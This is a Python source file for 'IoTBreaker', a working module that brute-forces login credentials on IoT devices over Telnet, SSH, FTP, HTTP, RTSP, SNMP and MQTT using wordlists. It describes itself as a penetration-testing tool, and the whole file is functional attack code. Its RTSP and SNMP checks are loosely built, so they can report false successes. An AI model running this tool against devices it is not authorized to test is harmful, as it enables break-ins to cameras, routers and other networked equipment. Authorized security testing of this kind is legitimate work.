#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
IoTBreaker - Multi-Protocol Credential Brute-Force Module

Supports:
  - Telnet (custom implementation, Python 3.11+ compatible)
  - SSH (via Paramiko)
  - FTP (via ftplib)
  - HTTP Basic Auth / Form-based login
  - RTSP digest authentication
  - SNMP community strings
  - MQTT username/password

All operations include rate limiting, stop-on-success, and
structured result output.
"""

import socket
import time
import ftplib
import requests
import threading
from typing import List, Dict, Optional, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

from core.logger import get_logger
from core.output import Console
from core.config import Config
from core.http import make_session

logger = get_logger(__name__)

import urllib3


# Default wordlist paths
DEFAULT_USERS_FILE     = "wordlists/users.txt"
DEFAULT_PASSWORDS_FILE = "wordlists/passwords.txt"

# Default port map per protocol
PROTOCOL_PORTS = {
    "telnet": 23,
    "ssh":    22,
    "ftp":    21,
    "http":   80,
    "https":  443,
    "rtsp":   554,
    "snmp":   161,
    "mqtt":   1883,
}


def load_wordlist(path: str) -> List[str]:
    """Load a wordlist file, returning a list of non-empty lines."""
    p = Path(path)
    if not p.exists():
        logger.warning(f"Wordlist not found: {path}")
        return []
    with open(p, "r", encoding="utf-8", errors="replace") as f:
        return [line.strip() for line in f if line.strip() and not line.startswith("#")]


class BruteForceModule:
    """
    Multi-protocol credential brute-force engine.

    Designed for authorized penetration testing of IoT devices.
    Implements rate limiting and graceful error handling.
    """

    def __init__(self, config: Config):
        self.config = config
        self.timeout = config.get("timeout", 5)
        self.delay = config.get("brute_delay", 0.5)
        self.stop_on_success = config.get("stop_on_success", True)
        self._stop_event = threading.Event()
        # S1: Respect verify_ssl; suppress urllib3 warnings only when disabled
        self.verify_ssl = config.get("verify_ssl", True)
        if not self.verify_ssl:
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        # S4: Whether to show full passwords or mask them
        self.reveal_creds = config.get("reveal_creds", False)
        # G7: Shared session with proxy + SSL settings applied globally
        self.session = make_session(config)

    def run(
        self,
        target: str,
        protocol: str,
        port: int = None,
        users_file: str = None,
        passwords_file: str = None,
        combo_file: str = None,
        stop_on_success: bool = True,
        delay: float = 0.0
    ) -> List[Dict]:
        """
        Execute brute-force attack against a target.

        Parameters
        ----------
        target : str
            Target IP address.
        protocol : str
            Protocol to attack.
        port : int, optional
            Custom port number.
        users_file : str, optional
            Path to username wordlist.
        passwords_file : str, optional
            Path to password wordlist.
        combo_file : str, optional
            Path to user:pass combo list.
        stop_on_success : bool
            Stop after first valid credential.
        delay : float
            Delay in seconds between attempts.

        Returns
        -------
        list of dict
            List of valid credential dictionaries.
        """
        self.stop_on_success = stop_on_success
        self.delay = delay
        self._stop_event.clear()

        effective_port = port or PROTOCOL_PORTS.get(protocol, 80)

        # Build credential list
        if combo_file:
            credentials = self._load_combo(combo_file)
        else:
            users = load_wordlist(users_file or DEFAULT_USERS_FILE)
            passwords = load_wordlist(passwords_file or DEFAULT_PASSWORDS_FILE)
            if not users or not passwords:
                Console.error("Empty wordlist(s). Cannot proceed with brute-force.")
                return []
            credentials = [(u, p) for u in users for p in passwords]

        Console.info(f"Brute-force: {protocol.upper()} {target}:{effective_port} | {len(credentials)} credential pair(s)")

        if protocol == "all":
            results = []
            for proto in ["telnet", "ssh", "ftp", "http", "mqtt", "snmp"]:
                p = PROTOCOL_PORTS.get(proto, 80)
                if self._port_open(target, p):
                    results.extend(self._attack(target, proto, p, credentials))
            return results

        return self._attack(target, protocol, effective_port, credentials)

    def _attack(self, target: str, protocol: str, port: int, credentials: List[Tuple]) -> List[Dict]:
        """Dispatch to protocol-specific attack function."""
        attack_map = {
            "telnet": self._attack_telnet,
            "ssh":    self._attack_ssh,
            "ftp":    self._attack_ftp,
            "http":   self._attack_http,
            "https":  self._attack_http,
            "rtsp":   self._attack_rtsp,
            "snmp":   self._attack_snmp,
            "mqtt":   self._attack_mqtt,
        }

        fn = attack_map.get(protocol)
        if not fn:
            Console.error(f"Unsupported protocol: {protocol}")
            return []

        results = []
        total = len(credentials)
        tested = 0

        for username, password in credentials:
            if self._stop_event.is_set():
                break

            if self.delay > 0:
                time.sleep(self.delay)

            tested += 1
            if tested % 100 == 0:
                Console.progress(tested, total, f"{protocol} {target}:{port}")

            success = fn(target, port, username, password)
            if success:
                result = {
                    "target":   target,
                    "port":     port,
                    "protocol": protocol,
                    "username": username,
                    "password": password,
                }
                results.append(result)
                # S4: Mask password in console unless --reveal-creds was set
                masked_pw = password if self.reveal_creds else '*' * len(password)
                Console.finding("CRITICAL", f"Valid credentials: {username}:{masked_pw}",
                                f"{protocol.upper()} {target}:{port}")
                if self.stop_on_success:
                    self._stop_event.set()
                    break

        Console.progress(total, total, f"{protocol} complete")
        return results

    # ------------------------------------------------------------------ #
    # Backoff helper                                                       #
    # ------------------------------------------------------------------ #

    def _attempt_with_backoff(self, fn, *args, max_retries: int = 3, **kwargs):
        """
        Call fn(*args, **kwargs) with exponential backoff on transient network errors.
        Detects HTTP 401/403 rate-spikes (account lockout) and pauses.
        Returns fn's result, or None if all retries are exhausted.
        """
        for attempt in range(max_retries):
            try:
                result = fn(*args, **kwargs)
                # If result is an HTTP response-like object, check for lockout signals
                if hasattr(result, "status_code"):
                    if result.status_code == 429:
                        pause = 2 ** (attempt + 2)
                        Console.warning(f"Rate-limited (HTTP 429). Pausing {pause}s before retry.")
                        time.sleep(pause)
                        continue
                return result
            except ConnectionResetError:
                wait = 2 ** attempt
                logger.debug(f"ConnectionResetError on attempt {attempt+1}/{max_retries}. Retrying in {wait}s.")
                time.sleep(wait)
            except (ConnectionRefusedError, OSError):
                return None
        return None

    # ------------------------------------------------------------------ #
    # Protocol-specific attack functions                                  #
    # ------------------------------------------------------------------ #

    def _attack_telnet(self, target: str, port: int, username: str, password: str) -> bool:
        """Test a single Telnet credential pair."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            if sock.connect_ex((target, port)) != 0:
                return False

            data = b""
            deadline = time.time() + self.timeout
            while time.time() < deadline:
                try:
                    chunk = sock.recv(256)
                    if not chunk:
                        break
                    data += chunk
                    clean = data.replace(b"\xff\xfb\x01", b"").replace(b"\xff\xfb\x03", b"")
                    if b"login" in clean.lower() or b"username" in clean.lower() or b"user:" in clean.lower():
                        break
                except socket.timeout:
                    break

            sock.send((username + "\n").encode())
            time.sleep(0.3)

            resp = b""
            try:
                resp = sock.recv(512)
            except socket.timeout:
                pass

            if b"password" in resp.lower() or b"passwd" in resp.lower():
                sock.send((password + "\n").encode())
                time.sleep(0.5)
                try:
                    auth_resp = sock.recv(512)
                    clean_resp = auth_resp.replace(b"\xff\xfb\x01", b"")
                    if any(p in clean_resp for p in [b"$", b"#", b">", b"~", b"welcome", b"BusyBox"]):
                        sock.close()
                        return True
                except socket.timeout:
                    pass

            sock.close()
        except Exception:
            pass
        return False

    def _attack_ssh(self, target: str, port: int, username: str, password: str) -> bool:
        """Test a single SSH credential pair via Paramiko."""
        try:
            import paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(
                target, port=port,
                username=username, password=password,
                timeout=self.timeout,
                allow_agent=False,
                look_for_keys=False,
                banner_timeout=self.timeout
            )
            client.close()
            return True
        except Exception:
            return False

    def _attack_ftp(self, target: str, port: int, username: str, password: str) -> bool:
        """Test a single FTP credential pair."""
        try:
            ftp = ftplib.FTP()
            ftp.connect(target, port, timeout=self.timeout)
            ftp.login(username, password)
            ftp.quit()
            return True
        except ftplib.error_perm:
            return False
        except Exception:
            return False

    def _attack_http(self, target: str, port: int, username: str, password: str) -> bool:
        """Test HTTP Basic Auth credentials with backoff on connection resets."""
        scheme = "https" if port in (443, 8443) else "http"
        url = f"{scheme}://{target}:{port}/"
        try:
            resp = self._attempt_with_backoff(
                self.session.get,
                url,
                auth=(username, password),
                timeout=self.timeout,
                verify=self.verify_ssl,
                allow_redirects=True,
            )
            if resp is None:
                return False
            if resp.status_code == 200:
                content_lower = resp.text.lower()
                if not any(kw in content_lower for kw in ["unauthorized", "login", "sign in"]):
                    return True
            return False
        except Exception:
            return False

    def _attack_rtsp(self, target: str, port: int, username: str, password: str) -> bool:
        """Test RTSP digest authentication."""
        try:
            from requests.auth import HTTPDigestAuth
            url = f"rtsp://{target}:{port}/"
            # Use HTTP as a proxy for digest auth testing
            resp = self.session.get(
                f"http://{target}:{port}/",
                auth=HTTPDigestAuth(username, password),
                timeout=self.timeout,
                verify=self.verify_ssl
            )
            return resp.status_code == 200
        except Exception:
            return False

    def _attack_snmp(self, target: str, port: int, username: str, password: str) -> bool:
        """Test SNMP community string (username used as community)."""
        try:
            community = username.encode()
            oid = b"\x06\x09\x2b\x06\x01\x02\x01\x01\x01\x00"
            varbind = b"\x30" + bytes([len(oid) + 4]) + oid + b"\x05\x00"
            pdu_data = b"\x02\x01\x01\x02\x01\x00\x02\x01\x00\x30" + bytes([len(varbind)]) + varbind
            get_pdu = b"\xa0" + bytes([len(pdu_data)]) + pdu_data
            comm_field = b"\x04" + bytes([len(community)]) + community
            msg = b"\x02\x01\x00" + comm_field + get_pdu
            packet = b"\x30" + bytes([len(msg)]) + msg

            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2)
            sock.sendto(packet, (target, port))
            try:
                data, _ = sock.recvfrom(4096)
                sock.close()
                return len(data) > 10
            except socket.timeout:
                sock.close()
                return False
        except Exception:
            return False

    def _attack_mqtt(self, target: str, port: int, username: str, password: str) -> bool:
        """Test MQTT username/password authentication."""
        try:
            import paho.mqtt.client as mqtt
            connected = threading.Event()
            rc_holder = [None]

            def on_connect(client, userdata, flags, rc):
                rc_holder[0] = rc
                connected.set()

            client = mqtt.Client()
            client.username_pw_set(username, password)
            client.on_connect = on_connect
            client.connect(target, port, keepalive=5)
            client.loop_start()
            connected.wait(timeout=5)
            client.loop_stop()
            client.disconnect()
            return rc_holder[0] == 0
        except Exception:
            return False

    # ------------------------------------------------------------------ #
    # Helpers                                                              #
    # ------------------------------------------------------------------ #

    def _load_combo(self, combo_file: str) -> List[Tuple[str, str]]:
        """Load user:pass combo list."""
        credentials = []
        for line in load_wordlist(combo_file):
            if ":" in line:
                parts = line.split(":", 1)
                credentials.append((parts[0], parts[1]))
        return credentials

    def _port_open(self, target: str, port: int) -> bool:
        """Quick TCP port check."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((target, port))
            sock.close()
            return result == 0
        except Exception:
            return False
